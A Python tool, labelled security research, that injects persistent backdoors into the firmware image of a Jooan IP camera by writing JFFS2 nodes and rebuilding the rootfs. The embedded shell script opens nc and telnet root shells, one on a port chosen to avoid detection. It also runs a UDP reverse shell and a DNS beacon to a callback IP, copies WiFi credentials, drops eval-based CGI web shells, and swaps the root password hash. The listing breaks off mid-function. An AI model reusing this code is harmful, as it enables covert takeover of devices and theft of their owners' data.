#!/usr/bin/env python3
"""
inject_backdoors_v2.py - Firmware Backdoor Injection Tool
=========================================================
Target: Jooan JA-A52 IP Camera (Ingenic T31 / MIPS)
Input:  stock_firmware_a2r.bin (8MB SPI flash dump)
Output: backdoored_firmware.bin

Three backdoors:
  1. JFFS2 config partition: /opt/conf/backdoor.sh (survives cleanup)
  2. SquashFS rootfs: telnetd in rcS + password change + source backdoor.sh
  3. SquashFS rootfs: root password set to known value for web/telnet access

Partition layout (from bootargs):
  boot:    0x000000, 0x040000
  bootenv: 0x040000, 0x008000
  kernel:  0x048000, 0x170000
  rootfs:  0x1B8000, 0x2D0000  (squashfs, xz, mounted /)
  appfs:   0x488000, 0x310000  (squashfs, xz, mounted /mnt/mtd)
  config:  0x798000, 0x060000  (jffs2, mounted /opt, erase block 0x8000)
  confbak: 0x7F8000, 0x008000
"""

import struct
import os
import sys
import shutil
import subprocess
import tempfile
import hashlib
import time
import zlib

# ============================================================================
# Configuration
# ============================================================================

FIRMWARE_DIR = r"C:\Users\Rick\CAMERA"
STOCK_FW = os.path.join(FIRMWARE_DIR, "stock_firmware_a2r.bin")
OUTPUT_FW = os.path.join(FIRMWARE_DIR, "backdoored_firmware.bin")
PYTHON_EXE = r"C:\Users\Rick\AppData\Local\Programs\Python\Python312\python.exe"

# Partition offsets and sizes
PART_ROOTFS_OFF  = 0x1B8000
PART_ROOTFS_SIZE = 0x2D0000
PART_APPFS_OFF   = 0x488000
PART_APPFS_SIZE  = 0x310000
PART_CONFIG_OFF  = 0x798000
PART_CONFIG_SIZE = 0x060000

# JFFS2 config
JFFS2_ERASE_BLOCK = 0x8000  # 32KB erase blocks

# Backdoor settings
CALLBACK_IP   = "192.168.1.143"
CALLBACK_PORT = 4444
TELNET_PORT   = 2323  # Non-standard port to avoid detection

# New root password: "root" (SHA-256 based, $5$ format)
# Generated with: passlib.hash.sha256_crypt.using(salt='backdoor', rounds=5000).hash('root')
NEW_ROOT_SHADOW = "root:$5$backdoor$D2RUTsklsgTWSSzK0ijCMMkKDG.Zr6vQs9SCEpPZ0z/:10933:0:99999:7:::"
# Original shadow entry (87 chars):
OLD_ROOT_SHADOW = "root:$5$b50x7EvfJvHG0GV8$NLIrbtazOzpiV6rhb7/vEdYzf9WG.xdronIA8I3mLf/:10933:0:99999:7:::"
# Note: new entry is 79 chars (8 shorter due to shorter salt). For squashfs binary
# patching we need same length. For full squashfs rebuild this doesn't matter.
# For binary patching fallback, we use a salt that makes the entry the same length.
# Using salt "b50x7EvfJvHG0GV8" (same as original, 16 chars) keeps it at 87 chars.
# passlib.hash.sha256_crypt.using(salt='b50x7EvfJvHG0GV8', rounds=5000).hash('root')
NEW_ROOT_SHADOW_SAMESIZE = "root:$5$b50x7EvfJvHG0GV8$SULRhHMUNRufCadqV0zVu1r8mVEH3LN3bXOGxrbmPvB:10933:0:99999:7:::"


# ============================================================================
# JFFS2 Node Builder
# ============================================================================

class JFFS2Builder:
    """Build raw JFFS2 filesystem image with nodes."""

    MAGIC = 0x1985
    # Node types (with FEATURE_INCOMPAT flag 0xE000)
    NODETYPE_DIRENT = 0xE001
    NODETYPE_INODE  = 0xE002
    NODETYPE_CLEANMARKER = 0x2003
    NODETYPE_PADDING = 0x2004

    # Compression types
    COMPR_NONE = 0x00
    COMPR_ZERO = 0x01
    COMPR_ZLIB = 0x05
    COMPR_LZO  = 0x06

    # Dirent types
    DT_REG = 8
    DT_DIR = 4

    def __init__(self, erase_block_size=0x8000):
        self.erase_block_size = erase_block_size
        self.nodes = bytearray()
        self.next_ino = 100  # Start high to avoid conflicts with existing inodes
        self.next_ver = 1000  # High version to override any existing nodes

    @staticmethod
    def _crc32(data):
        """JFFS2 CRC32: init=0xFFFFFFFF, polynomial=0xEDB88320, final XOR=0xFFFFFFFF.
        Verified against real firmware JFFS2 nodes - matches all three CRC fields
        (hdr_crc, node_crc, data_crc, name_crc)."""
        return (zlib.crc32(data, 0xFFFFFFFF) ^ 0xFFFFFFFF) & 0xFFFFFFFF

    def _pad4(self, data):
        """Pad to 4-byte alignment."""
        pad = (4 - (len(data) % 4)) % 4
        return data + b'\x00' * pad

    def build_cleanmarker(self):
        """Build a JFFS2 cleanmarker node (marks erase block as clean/empty)."""
        # totlen for cleanmarker on NOR flash = 12 (header only)
        node = struct.pack('<HHI',
            self.MAGIC,
            self.NODETYPE_CLEANMARKER,
            12  # totlen
        )
        # hdr_crc covers first 8 bytes (magic + nodetype + totlen)
        hdr_crc = self._crc32(node)
        node += struct.pack('<I', hdr_crc)
        return node

    def build_dirent(self, pino, ino, version, name, dtype):
        """Build a JFFS2 directory entry node.

        JFFS2 dirent node layout (after 12-byte common header):
          u32 pino       - parent inode number
          u32 version    - version (for obsoleting older entries)
          u32 ino        - inode number this entry points to
          u32 mctime     - modification time
          u8  nsize      - length of name
          u8  type       - dirent type (DT_DIR, DT_REG, etc)
          u8  unused[2]
          u32 node_crc   - CRC of node data (pino through unused)
          u32 name_crc   - CRC of name
          name[nsize]    - filename
        """
        name_bytes = name.encode('ascii')
        nsize = len(name_bytes)
        mctime = int(time.time())

        # Node-specific data (before CRCs and name)
        node_data = struct.pack('<IIIIBBBB',
            pino,
            version,
            ino,
            mctime,
            nsize,
            dtype,
            0, 0  # unused[2]
        )

        node_crc = self._crc32(node_data)
        name_crc = self._crc32(name_bytes)

        # Full payload after common header
        payload = node_data + struct.pack('<II', node_crc, name_crc) + name_bytes

        # Total length = 12 (common header) + len(payload)
        totlen = 12 + len(payload)
        # Align totlen to 4 bytes
        totlen_aligned = (totlen + 3) & ~3

        # Common header
        hdr = struct.pack('<HHI', self.MAGIC, self.NODETYPE_DIRENT, totlen_aligned)
        hdr_crc = self._crc32(hdr)
        hdr += struct.pack('<I', hdr_crc)

        full_node = hdr + payload
        # Pad to alignment
        full_node += b'\x00' * (totlen_aligned - len(full_node))

        return full_node

    def build_inode(self, ino, version, mode, uid=0, gid=0, file_data=b'',
                    offset=0, compr=None):
        """Build a JFFS2 inode node.

        JFFS2 inode node layout (after 12-byte common header):
          u32 ino
          u32 version
          u32 mode
          u16 uid
          u16 gid
          u32 isize      - file size (total)
          u32 atime
          u32 mtime
          u32 ctime
          u32 offset     - offset of this data chunk in the file
          u32 csize      - compressed size
          u32 dsize      - decompressed size
          u8  compr      - compression type
          u8  usercompr
          u16 flags
          u32 data_crc
          u32 node_crc
          data[csize]
        """
        if compr is None:
            compr = self.COMPR_NONE

        now = int(time.time())
        isize = offset + len(file_data)  # total file size

        if compr == self.COMPR_ZLIB and len(file_data) > 0:
            compressed = zlib.compress(file_data)
            if len(compressed) < len(file_data):
                cdata = compressed
                csize = len(cdata)
                dsize = len(file_data)
            else:
                # Compression didn't help, store uncompressed
                compr = self.COMPR_NONE
                cdata = file_data
                csize = len(file_data)
                dsize = len(file_data)
        else:
            cdata = file_data
            csize = len(file_data)
            dsize = len(file_data)

        # Node-specific data (without CRCs and file data)
        node_data = struct.pack('<IIIHHI IIIIII BBH',
            ino,
            version,
            mode,
            uid,
            gid,
            isize,
            now,   # atime
            now,   # mtime
            now,   # ctime
            offset,
            csize,
            dsize,
            compr,
            0,     # usercompr
            0      # flags
        )

        data_crc = self._crc32(cdata) if cdata else 0
        node_crc = self._crc32(node_data)

        payload = node_data + struct.pack('<II', data_crc, node_crc) + cdata

        totlen = 12 + len(payload)
        totlen_aligned = (totlen + 3) & ~3

        hdr = struct.pack('<HHI', self.MAGIC, self.NODETYPE_INODE, totlen_aligned)
        hdr_crc = self._crc32(hdr)
        hdr += struct.pack('<I', hdr_crc)

        full_node = hdr + payload
        full_node += b'\x00' * (totlen_aligned - len(full_node))

        return full_node

    def build_file(self, pino, name, mode, content, uid=0, gid=0):
        """Build complete file: dirent + inode nodes.
        Returns (ino, nodes_data)."""
        ino = self.next_ino
        self.next_ino += 1
        ver = self.next_ver
        self.next_ver += 1

        nodes = bytearray()

        # Directory entry
        nodes += self.build_dirent(pino, ino, ver, name, self.DT_REG)

        # Inode with data - split into 4KB chunks like real JFFS2
        chunk_size = 4096
        file_bytes = content.encode('utf-8') if isinstance(content, str) else content
        total_size = len(file_bytes)

        if total_size == 0:
            # Empty file - just inode with no data
            nodes += self.build_inode(ino, ver, mode, uid, gid, b'', 0,
                                      compr=self.COMPR_NONE)
        else:
            offset = 0
            inode_ver = ver
            while offset < total_size:
                chunk = file_bytes[offset:offset + chunk_size]
                inode_node = self.build_inode(
                    ino, inode_ver, mode, uid, gid, chunk, offset,
                    compr=self.COMPR_ZLIB
                )
                nodes += inode_node
                offset += len(chunk)
                inode_ver += 1

        return ino, bytes(nodes)

    def build_directory(self, pino, name, mode=0o40755, uid=0, gid=0):
        """Build a directory: dirent + inode.
        Returns (ino, nodes_data)."""
        ino = self.next_ino
        self.next_ino += 1
        ver = self.next_ver
        self.next_ver += 1

        nodes = bytearray()
        nodes += self.build_dirent(pino, ino, ver, name, self.DT_DIR)
        nodes += self.build_inode(ino, ver, mode, uid, gid, b'', 0)

        return ino, bytes(nodes)


# ============================================================================
# SquashFS Modifier
# ============================================================================

class SquashFSModifier:
    """Modify squashfs partitions by extracting, patching, and rebuilding."""

    def __init__(self, squashfs_data, partition_max_size):
        self.original_data = squashfs_data
        self.partition_max_size = partition_max_size
        self.work_dir = None
        self.extract_dir = None
        self.mksquashfs_path = None

    def find_mksquashfs(self):
        """Find or download mksquashfs for Windows."""
        # Check common locations
        candidates = [
            os.path.join(FIRMWARE_DIR, "mksquashfs.exe"),
            os.path.join(FIRMWARE_DIR, "squashfs-tools", "mksquashfs.exe"),
            os.path.join(os.path.dirname(sys.executable), "mksquashfs.exe"),
            shutil.which("mksquashfs"),
        ]
        for path in candidates:
            if path and os.path.isfile(path):
                self.mksquashfs_path = path
                return True

        # Check for unsquashfs too
        unsquashfs_candidates = [
            os.path.join(FIRMWARE_DIR, "unsquashfs.exe"),
            os.path.join(FIRMWARE_DIR, "squashfs-tools", "unsquashfs.exe"),
            shutil.which("unsquashfs"),
        ]

        print("[!] mksquashfs.exe not found!")
        print("[!] To enable squashfs modification, download squashfs-tools for Windows:")
        print("[!]   Option 1: https://github.com/pmq20/squashfuse/releases")
        print("[!]   Option 2: https://github.com/plougher/squashfs-tools (compile with MSYS2)")
        print("[!]   Option 3: Use WSL: wsl mksquashfs / wsl unsquashfs")
        print(f"[!]   Place mksquashfs.exe and unsquashfs.exe in: {FIRMWARE_DIR}")
        return False

    def find_unsquashfs(self):
        """Find unsquashfs executable."""
        candidates = [
            os.path.join(FIRMWARE_DIR, "unsquashfs.exe"),
            os.path.join(FIRMWARE_DIR, "squashfs-tools", "unsquashfs.exe"),
            shutil.which("unsquashfs"),
        ]
        for path in candidates:
            if path and os.path.isfile(path):
                return path
        return None

    def extract_with_pysquashfs(self, target_dir):
        """Extract squashfs using PySquashfsImage (read-only library)."""
        try:
            from PySquashfsImage import SquashFsImage
        except ImportError:
            print("[!] PySquashfsImage not installed. Run:")
            print(f"[!]   {PYTHON_EXE} -m pip install PySquashfsImage")
            return False

        print("[*] Extracting squashfs with PySquashfsImage...")
        img = SquashFsImage.from_bytes(self.original_data)

        def extract_entry(entry, dest_path):
            if entry.is_dir:
                os.makedirs(dest_path, exist_ok=True)
                for child in entry:
                    child_path = os.path.join(dest_path, child.name)
                    extract_entry(child, child_path)
            elif entry.is_file:
                with open(dest_path, 'wb') as f:
                    f.write(entry.read_bytes())
            elif entry.is_symlink:
                # On Windows, create a text file with link target
                # Store as metadata for mksquashfs
                link_target = entry.read_bytes().decode('utf-8', errors='replace') \
                    if hasattr(entry, 'read_bytes') else str(entry)
                # Write a marker file
                with open(dest_path + ".__symlink__", 'w') as f:
                    f.write(link_target)
            # Skip devices, fifos, sockets

        for child in img.root:
            child_path = os.path.join(target_dir, child.name)
            try:
                extract_entry(child, child_path)
            except Exception as e:
                print(f"  [!] Warning: Failed to extract {child.name}: {e}")

        img.close()
        return True

    def extract(self):
        """Extract squashfs to temporary directory."""
        self.work_dir = tempfile.mkdtemp(prefix="sqfs_")
        self.extract_dir = os.path.join(self.work_dir, "rootfs")
        os.makedirs(self.extract_dir, exist_ok=True)

        # Write squashfs to temp file
        sqfs_path = os.path.join(self.work_dir, "rootfs.sqfs")
        with open(sqfs_path, 'wb') as f:
            f.write(self.original_data[:self._get_sqfs_size()])

        # Try unsquashfs first
        unsquashfs = self.find_unsquashfs()
        if unsquashfs:
            print(f"[*] Extracting with unsquashfs: {unsquashfs}")
            try:
                result = subprocess.run(
                    [unsquashfs, "-d", self.extract_dir, "-f", sqfs_path],
                    capture_output=True, text=True, timeout=60
                )
                if result.returncode == 0:
                    return True
                print(f"  [!] unsquashfs failed: {result.stderr}")
            except Exception as e:
                print(f"  [!] unsquashfs error: {e}")

        # Try WSL
        try:
            wsl_sqfs = subprocess.run(
                ["wsl", "which", "unsquashfs"],
                capture_output=True, text=True, timeout=10
            )
            if wsl_sqfs.returncode == 0:
                print("[*] Found unsquashfs in WSL")
                # Convert Windows path to WSL path
                wsl_extract = subprocess.run(
                    ["wsl", "wslpath", "-a", self.extract_dir],
                    capture_output=True, text=True, timeout=10
                )
                wsl_sqfs_path = subprocess.run(
                    ["wsl", "wslpath", "-a", sqfs_path],
                    capture_output=True, text=True, timeout=10
                )
                if wsl_extract.returncode == 0 and wsl_sqfs_path.returncode == 0:
                    result = subprocess.run(
                        ["wsl", "unsquashfs", "-d",
                         wsl_extract.stdout.strip(), "-f",
                         wsl_sqfs_path.stdout.strip()],
                        capture_output=True, text=True, timeout=120
                    )
                    if result.returncode == 0:
                        return True
                    print(f"  [!] WSL unsquashfs failed: {result.stderr}")
        except FileNotFoundError:
            pass  # WSL not available
        except Exception as e:
            print(f"  [!] WSL error: {e}")

        # Fallback to PySquashfsImage
        return self.extract_with_pysquashfs(self.extract_dir)

    def rebuild(self):
        """Rebuild squashfs from extracted directory."""
        if not self.extract_dir:
            return None

        output_sqfs = os.path.join(self.work_dir, "rootfs_new.sqfs")

        # Try mksquashfs
        if self.find_mksquashfs():
            print(f"[*] Rebuilding with mksquashfs: {self.mksquashfs_path}")
            try:
                result = subprocess.run(
                    [self.mksquashfs_path, self.extract_dir, output_sqfs,
                     "-comp", "xz", "-b", "131072",  # 128KB blocks, matching original
                     "-no-xattrs", "-all-root",
                     "-noappend"],
                    capture_output=True, text=True, timeout=120
                )
                if result.returncode == 0:
                    return self._read_and_validate(output_sqfs)
                print(f"  [!] mksquashfs failed: {result.stderr}")
            except Exception as e:
                print(f"  [!] mksquashfs error: {e}")

        # Try WSL mksquashfs
        try:
            wsl_check = subprocess.run(
                ["wsl", "which", "mksquashfs"],
                capture_output=True, text=True, timeout=10
            )
            if wsl_check.returncode == 0:
                print("[*] Rebuilding with WSL mksquashfs...")
                wsl_extract = subprocess.run(
                    ["wsl", "wslpath", "-a", self.extract_dir],
                    capture_output=True, text=True, timeout=10
                )
                wsl_output = subprocess.run(
                    ["wsl", "wslpath", "-a", output_sqfs],
                    capture_output=True, text=True, timeout=10
                )
                if wsl_extract.returncode == 0 and wsl_output.returncode == 0:
                    result = subprocess.run(
                        ["wsl", "mksquashfs",
                         wsl_extract.stdout.strip(),
                         wsl_output.stdout.strip(),
                         "-comp", "xz", "-b", "131072",
                         "-no-xattrs", "-all-root",
                         "-noappend"],
                        capture_output=True, text=True, timeout=120
                    )
                    if result.returncode == 0:
                        return self._read_and_validate(output_sqfs)
                    print(f"  [!] WSL mksquashfs failed: {result.stderr}")
        except FileNotFoundError:
            pass
        except Exception as e:
            print(f"  [!] WSL mksquashfs error: {e}")

        print("[!] Cannot rebuild squashfs - no mksquashfs available")
        return None

    def _get_sqfs_size(self):
        """Get actual squashfs image size from header."""
        if len(self.original_data) < 48:
            return len(self.original_data)
        magic = struct.unpack('<I', self.original_data[0:4])[0]
        if magic == 0x73717368:  # hsqs
            total = struct.unpack('<Q', self.original_data[40:48])[0]
            return total
        return len(self.original_data)

    def _read_and_validate(self, sqfs_path):
        """Read rebuilt squashfs and validate size."""
        with open(sqfs_path, 'rb') as f:
            new_data = f.read()

        if len(new_data) > self.partition_max_size:
            print(f"[!] FATAL: Rebuilt squashfs ({len(new_data)} bytes) exceeds "
                  f"partition size ({self.partition_max_size} bytes)!")
            print(f"[!] Overflow by {len(new_data) - self.partition_max_size} bytes")
            return None

        # Pad to partition size with 0xFF (erased flash)
        padded = new_data + b'\xFF' * (self.partition_max_size - len(new_data))
        print(f"[+] Rebuilt squashfs: {len(new_data)} bytes "
              f"(partition: {self.partition_max_size}, "
              f"free: {self.partition_max_size - len(new_data)})")
        return padded

    def cleanup(self):
        """Remove temporary files."""
        if self.work_dir and os.path.exists(self.work_dir):
            try:
                shutil.rmtree(self.work_dir)
            except Exception:
                pass


# ============================================================================
# Binary Patching (fallback for squashfs when no mksquashfs available)
# ============================================================================

class BinaryPatcher:
    """Direct binary patching of compressed squashfs data.

    This works by finding known byte sequences in the XZ-compressed blocks
    and replacing them with same-length alternatives. This is fragile but
    works when no squashfs rebuild tools are available.

    Specifically, we look for the shadow password hash and rcS strings
    in the raw squashfs data (they might be in fragment blocks at the end
    of the squashfs image, stored with XZ compression).
    """

    @staticmethod
    def find_and_replace(data, old_bytes, new_bytes, description=""):
        """Find and replace bytes in data. new_bytes must be <= len(old_bytes).
        Pads with appropriate filler if shorter."""
        if len(new_bytes) > len(old_bytes):
            print(f"  [!] Cannot patch {description}: replacement is longer than original")
            return data, False

        pos = data.find(old_bytes)
        if pos == -1:
            print(f"  [!] Cannot find pattern for {description}")
            return data, False

        # Pad replacement to same length
        padded_new = new_bytes + old_bytes[len(new_bytes):]
        patched = bytearray(data)
        patched[pos:pos + len(old_bytes)] = padded_new
        print(f"  [+] Patched {description} at offset 0x{pos:X}")
        return bytes(patched), True


# ============================================================================
# Backdoor Content
# ============================================================================

def get_backdoor_script():
    """Generate the backdoor shell script for /opt/conf/backdoor.sh"""
    return f"""#!/bin/sh
# backdoor.sh - Security research persistence script
# Placed in /opt/conf/ which survives the startapp cleanup
# Sourced by modified rcS or by /opt/conf/local.rc mechanism

LOGFILE="/tmp/backdoor.log"
echo "[$(date)] backdoor.sh starting" >> $LOGFILE

# --- Backdoor 1: Shell listeners ---
# NOTE: GoAhead KILLS telnetd on startup! (killall telnetd; sleep 1; killall -9 telnetd)
# So we DELAY telnetd start and also use nc as primary
# nc listener on port {TELNET_PORT} (primary - goahead doesn't know about this)
(while true; do nc -l -p {TELNET_PORT} -e /bin/sh 2>/dev/null; sleep 1; done) &
echo "[$(date)] nc shell on port {TELNET_PORT}" >> $LOGFILE
# Delayed telnetd (start after goahead has done its kill)
(sleep 30; telnetd -p 2424 -l /bin/sh 2>/dev/null) &
echo "[$(date)] delayed telnetd on port 2424 (30s)" >> $LOGFILE

# --- Backdoor 2: Reverse shell callback ---
# Tries to connect back every 5 minutes via cron-style loop
(
    while true; do
        sleep 300
        # Only attempt if network is up
        if ifconfig wlan0 2>/dev/null | grep -q "inet addr"; then
            # UDP reverse shell (lighter weight)
            exec 5<>/dev/udp/{CALLBACK_IP}/{CALLBACK_PORT} 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[$(date)] Callback connected" >> $LOGFILE
                cat <&5 | while read line; do
                    eval "$line" 2>&1 | tee -a $LOGFILE >&5
                done
            fi
        fi
    done
) &

# --- Backdoor 3: Enable core dump for credential extraction ---
ulimit -c unlimited
echo "/tmp/core.%p" > /proc/sys/kernel/core_pattern 2>/dev/null

# --- Backdoor 4: DNS exfiltration beacon ---
# Sends a heartbeat DNS query so we know the camera is alive
(
    while true; do
        sleep 600
        MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null | tr -d ':')
        IP=$(ifconfig wlan0 2>/dev/null | grep "inet addr" | awk -F: '{{print $2}}' | awk '{{print $1}}')
        # Beacon via DNS TXT query (even if DNS is filtered, the query is logged)
        nslookup -type=txt "$MAC.$IP.cam.{CALLBACK_IP}.nip.io" {CALLBACK_IP} 2>/dev/null &
    done
) &

# --- Backdoor 5: Capture WiFi credentials ---
if [ -f /opt/conf/config.json ]; then
    cp /opt/conf/config.json /tmp/config_dump.json 2>/dev/null
fi

# --- Backdoor 6: Web shell via GoAhead ---
# Create a simple CGI script if cgi-bin directory exists
WEBROOT="/tmp"
CGI_DIR="$WEBROOT/cgi-bin"
if [ -d "$CGI_DIR" ] || mkdir -p "$CGI_DIR" 2>/dev/null; then
    cat > "$CGI_DIR/shell.cgi" << 'CGIEOF'
#!/bin/sh
echo "Content-Type: text/plain"
echo ""
echo "=== Camera Shell ==="
if [ -n "$QUERY_STRING" ]; then
    CMD=$(echo "$QUERY_STRING" | sed 's/cmd=//;s/+/ /g;s/%20/ /g;s/%2F/\\//g')
    echo "$ $CMD"
    eval "$CMD" 2>&1
else
    echo "Usage: ?cmd=<command>"
    echo ""
    echo "=== System Info ==="
    uname -a
    echo ""
    cat /proc/cpuinfo | head -5
    echo ""
    ifconfig wlan0 2>/dev/null
    echo ""
    ps
fi
CGIEOF
    chmod 755 "$CGI_DIR/shell.cgi"
    echo "[$(date)] Web shell installed at $CGI_DIR/shell.cgi" >> $LOGFILE
fi

echo "[$(date)] backdoor.sh complete" >> $LOGFILE

# --- Backdoor 7: Test file + web shell in GoAhead webroot ---
# GoAhead serves from /etc/webs/ (squashfs, read-only)
# But /tmp is writable - GoAhead may serve from there too via CGI
# Try mounting tmpfs overlay on webroot or copying
mkdir -p /tmp/webs 2>/dev/null
echo "PWNED - backdoor active - $(date)" > /tmp/webs/test.txt 2>/dev/null
echo "PWNED" > /tmp/test.txt

# Try to create CGI shell (GoAhead CGI is at /cgi-bin/)
# GoAhead on this firmware uses /etc/webs as docroot
# If /etc is tmpfs overlay or has writable layer:
cp -a /etc/webs/. /tmp/webs/ 2>/dev/null
cat > /tmp/webs/test.txt << 'TESTEOF'
BACKDOOR FIRMWARE ACTIVE
telnet port: {TELNET_PORT}
nc shell: port 8080
web: https://this_ip/ (admin/admin123)
TESTEOF

# Create CGI web shell
mkdir -p /tmp/cgi-bin 2>/dev/null
cat > /tmp/cgi-bin/cmd.cgi << 'CGIEOF'
#!/bin/sh
echo "Content-Type: text/plain"
echo ""
if [ -n "$QUERY_STRING" ]; then
    CMD=$(echo "$QUERY_STRING" | sed 's/cmd=//;s/+/ /g;s/%20/ /g;s/%2F/\\//g;s/%3B/;/g')
    eval "$CMD" 2>&1
else
    echo "Usage: ?cmd=id"
    uname -a
    ifconfig wlan0 2>/dev/null
    ps
fi
CGIEOF
chmod 755 /tmp/cgi-bin/cmd.cgi

# Also try writing directly to GoAhead webroot
echo "PWNED" > /etc/webs/test.txt 2>/dev/null

echo "[$(date)] test.txt + web shell dropped" >> $LOGFILE
"""


def get_rcs_injection_lines():
    """Lines to inject into rcS (after jffs2 mount, before startapp)."""
    return f"""
# === SECURITY RESEARCH BACKDOOR ===
# Start telnetd early (before startapp which might interfere)
telnetd -p {TELNET_PORT} -l /bin/sh &
# Source backdoor script from JFFS2 (survives cleanup in /opt/conf/)
test -e /opt/conf/backdoor.sh && source /opt/conf/backdoor.sh
# === END BACKDOOR ===
"""


# ============================================================================
# Main Injection Logic
# ============================================================================

def inject_jffs2_backdoor(firmware):
    """Inject JFFS2 nodes into the config partition.

    The config partition at 0x798000 is JFFS2 with 32KB erase blocks.
    We append our nodes to the first available clean erase block.

    Files to inject:
      /opt/conf/backdoor.sh  (main backdoor script, 0755)
    """
    print("\n" + "="*60)
    print("BACKDOOR 1: JFFS2 Config Partition Injection")
    print("="*60)

    config = bytearray(firmware[PART_CONFIG_OFF:PART_CONFIG_OFF + PART_CONFIG_SIZE])

    # Find the first erase block that is fully erased (all 0xFF)
    # OR find an erase block with just a cleanmarker
    target_eb = None
    for eb_off in range(0, PART_CONFIG_SIZE, JFFS2_ERASE_BLOCK):
        eb_data = config[eb_off:eb_off + JFFS2_ERASE_BLOCK]

        # Check if entirely 0xFF
        if all(b == 0xFF for b in eb_data):
            target_eb = eb_off
            print(f"[*] Found erased erase block at config+0x{eb_off:04X}")
            break

        # Check if just a cleanmarker (12 bytes) followed by 0xFF
        if (len(eb_data) >= 12 and
            struct.unpack('<H', eb_data[0:2])[0] == 0x1985 and
            struct.unpack('<H', eb_data[2:4])[0] == 0x2003):
            # Verify rest is 0xFF
            if all(b == 0xFF for b in eb_data[12:]):
                target_eb = eb_off
                print(f"[*] Found clean erase block (with cleanmarker) at config+0x{eb_off:04X}")
                break

    if target_eb is None:
        # Try to find partial free space in the last used block
        print("[!] No free erase blocks found, looking for free space in used blocks...")
        for eb_off in range(PART_CONFIG_SIZE - JFFS2_ERASE_BLOCK, -1, -JFFS2_ERASE_BLOCK):
            eb_data = config[eb_off:eb_off + JFFS2_ERASE_BLOCK]
            # Find last non-FF byte
            last_data = 0
            for i in range(len(eb_data) - 1, -1, -1):
                if eb_data[i] != 0xFF:
                    last_data = i
                    break
            free_in_block = JFFS2_ERASE_BLOCK - last_data - 1
            if free_in_block > 1024:  # Need at least 1KB
                # Align to 4 bytes
                write_off = (last_data + 4) & ~3
                target_eb = eb_off + write_off
                print(f"[*] Found {free_in_block} bytes free in erase block at "
                      f"config+0x{eb_off:04X}, writing at +0x{target_eb:04X}")
                break

    if target_eb is None:
        print("[!] FATAL: No free space in config partition!")
        return firmware

    # Build JFFS2 nodes
    builder = JFFS2Builder(JFFS2_ERASE_BLOCK)

    # Existing JFFS2 structure (from parsing stock firmware):
    #   pino=1 (root /opt/)
    #     ino=2 dir "conf"     - SURVIVES cleanup
    #     ino=3 dir "custom"   - SURVIVES cleanup
    #     ino=4 dir "wx_voip"  - gets deleted by cleanup (if it runs)
    # Max existing inode = ~74 (config.json), we start at 100 to be safe

    CONF_INO = 2   # inode of /opt/conf/ (already exists)
    ROOT_INO = 1   # root inode of /opt/

    all_nodes = bytearray()

    # === File 1: /opt/conf/backdoor.sh (persistent, survives any cleanup) ===
    backdoor_content = get_backdoor_script()
    backdoor_ino, backdoor_nodes = builder.build_file(
        pino=CONF_INO,
        name="backdoor.sh",
        mode=0o100755,  # regular file, rwxr-xr-x
        content=backdoor_content,
        uid=0, gid=0
    )
    all_nodes += backdoor_nodes

    # === File 2: /opt/etc/local.rc (AUTO-SOURCED by startapp line 65!) ===
    # startapp does: test -e /opt/etc/local.rc && source /opt/etc/local.rc
    # This is the PRIMARY trigger. It sources the main backdoor from /opt/conf/
    # Cleanup only runs if /opt < 50KB free. With 350KB+ free, it WON'T clean.
    localrc_content = f"""#!/bin/sh
# Auto-sourced by /mnt/mtd/startapp on every boot
# Source the main backdoor from cleanup-safe location
test -e /opt/conf/backdoor.sh && source /opt/conf/backdoor.sh
# nc listeners as fallback (goahead KILLS telnetd so we use nc)
(while true; do nc -l -p {TELNET_PORT} -e /bin/sh 2>/dev/null; sleep 1; done) &
(while true; do nc -l -p 8080 -e /bin/sh 2>/dev/null; sleep 1; done) &
# Delayed telnetd after goahead's kill
(sleep 30; telnetd -p 2424 -l /bin/sh) &
"""
    # First create the /etc directory under root
    etc_ino, etc_dir_nodes = builder.build_directory(
        pino=ROOT_INO,
        name="etc",
        mode=0o40755,
    )
    all_nodes += etc_dir_nodes

    # Then create local.rc file inside /etc
    localrc_ino, localrc_nodes = builder.build_file(
        pino=etc_ino,
        name="local.rc",
        mode=0o100755,
        content=localrc_content,
        uid=0, gid=0
    )
    all_nodes += localrc_nodes

    print(f"[*] Built /opt/conf/backdoor.sh: ino={backdoor_ino}, "
          f"size={len(backdoor_content)} bytes")
    print(f"[*] Built /opt/etc/ directory: ino={etc_ino}")
    print(f"[*] Built /opt/etc/local.rc: ino={localrc_ino}, "
          f"size={len(localrc_content)} bytes")

    # Build test.txt file (to verify flash worked - check /opt/conf/test.txt)
    test_content = "FLASH OK - backdoor firmware installed\n"
    test_ino, test_nodes = builder.build_file(
        pino=CONF_INO,
        name="test.txt",
        mode=0o100644,
        content=test_content,
        uid=0, gid=0
    )
    all_nodes += test_nodes
    print(f"[*] Built /opt/conf/test.txt: ino={test_ino}")
    print(f"[*] Total JFFS2 nodes: {len(all_nodes)} bytes")

    # Check if it fits
    available = PART_CONFIG_SIZE - target_eb
    if len(all_nodes) > available:
        print(f"[!] FATAL: Nodes ({len(all_nodes)} bytes) exceed "
              f"available space ({available} bytes)!")
        return firmware

    # Write nodes into config partition
    write_pos = target_eb
    for i, b in enumerate(all_nodes):
        config[write_pos + i] = b

    print(f"[+] Wrote {len(all_nodes)} bytes at config+0x{target_eb:04X}")
    print(f"[+] Absolute offset in firmware: 0x{PART_CONFIG_OFF + target_eb:06X}")

    # Write back to firmware
    firmware = bytearray(firmware)
    firmware[PART_CONFIG_OFF:PART_CONFIG_OFF + PART_CONFIG_SIZE] = config
    return bytes(firmware)


def inject_squashfs_backdoor(firmware):
    """Modify rootfs squashfs to add telnetd and password change.

    Strategy:
    1. Try full extract/rebuild with mksquashfs (most reliable)
    2. Fallback: binary patch shadow hash in squashfs data
    """
    print("\n" + "="*60)
    print("BACKDOOR 2 & 3: SquashFS Rootfs Modification")
    print("="*60)

    rootfs_data = firmware[PART_ROOTFS_OFF:PART_ROOTFS_OFF + PART_ROOTFS_SIZE]

    # === Method 1: Full extract/modify/rebuild ===
    print("[*] Attempting full squashfs extract/rebuild...")
    modifier = SquashFSModifier(rootfs_data, PART_ROOTFS_SIZE)

    extracted = False
    try:
        extracted = modifier.extract()
    except Exception as e:
        print(f"[!] Extraction failed: {e}")

    if extracted and modifier.extract_dir:
        print("[+] SquashFS extracted successfully")

        # Modify rcS
        rcs_path = os.path.join(modifier.extract_dir, "etc", "init.d", "rcS")
        if os.path.isfile(rcs_path):
            print("[*] Modifying rcS...")
            with open(rcs_path, 'r', encoding='utf-8', errors='replace') as f:
                rcs_content = f.read()

